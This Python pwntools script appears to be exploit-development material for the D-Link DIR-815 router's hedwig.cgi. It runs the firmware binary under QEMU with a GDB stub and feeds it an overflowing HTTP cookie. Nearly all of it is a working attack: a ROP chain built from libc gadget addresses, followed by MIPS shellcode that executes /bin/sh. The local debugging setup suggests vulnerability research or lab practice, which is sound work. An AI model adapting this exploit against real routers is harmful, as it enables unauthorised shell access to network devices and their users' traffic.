#!/usr/bin/env python3
"""Run the local DIR-815 Hedwig payload under QEMU's GDB stub.

Start this script, then from another terminal connect with:
    gdb-multiarch -q /path/to/rootfs/htdocs/cgibin
    set architecture mips
    set endian little
    target remote :1234
    break *0x409968   # b09 call site; verify for the exact firmware build
    continue
"""
from pathlib import Path
import shutil

from pwn import *

context(os="linux", arch="mips", endian="little", log_level="debug")

libc_base = 0x2b300000
GDB_PORT = 1234

# This file is expected at rootfs/htdocs/exp_gdb.py.
ROOTFS = Path(__file__).resolve().parent.parent
CGI = ROOTFS / "htdocs" / "cgibin"
QEMU = shutil.which("qemu-mipsel-static") or shutil.which("qemu-mipsel")

if QEMU is None:
    raise RuntimeError("找不到 qemu-mipsel-static 或 qemu-mipsel")
if not CGI.is_file():
    raise FileNotFoundError(f"找不到 CGI 程序：{CGI}")

# ROP payload (kept in the same layout as the supplied exp).
payload = b"a" * 0x3CD
payload += b"a" * 4
payload += p32(libc_base + 0x436D0)  # s1: move $t9, $s3
payload += b"a" * 4
payload += p32(libc_base + 0x56BD0)  # s3: sleep
payload += b"a" * (4 * 5)
payload += p32(libc_base + 0x57E50)  # ra: li $a0, 1

payload += b"a" * 0x18
payload += b"a" * (4 * 4)
payload += p32(libc_base + 0x37E6C)  # s4: move $t9, $a1
payload += p32(libc_base + 0x3B974)  # ra: addiu $a1, $sp, 0x18

shellcode = asm("""
    slti $a2, $zero, -1
    li   $t7, 0x69622f2f
    sw   $t7, -12($sp)
    li   $t6, 0x68732f6e
    sw   $t6, -8($sp)
    sw   $zero, -4($sp)
    la   $a0, -12($sp)
    slti $a1, $zero, -1
    li   $v0, 4011
    syscall 0x40404
""")

payload += b"a" * 0x18
payload += shellcode

cookie = b"uid=" + payload
body = b"winmt=pwner"

# execve environment entries cannot contain NUL bytes.
if b"\x00" in cookie:
    raise ValueError("构造出的 HTTP_COOKIE 含 NUL，无法作为环境变量传入")

env = {
    "PATH": "/usr/bin:/bin",
    "REQUEST_METHOD": "POST",
    "REQUEST_URI": "/hedwig.cgi?x=y",
    "CONTENT_TYPE": "application/x-www-form-urlencoded",
    "CONTENT_LENGTH": str(len(body)),
    "HTTP_COOKIE": cookie,
}



io = process(
    [
        QEMU,
        "-g", str(GDB_PORT),
        "-0", "hedwig.cgi",
        "-L", str(ROOTFS),
        str(CGI),
    ],
    env=env,
    cwd=str(ROOTFS),
)

# The guest is held at the QEMU GDB stub; this small body is queued on stdin.
io.send(body)
io.interactive()
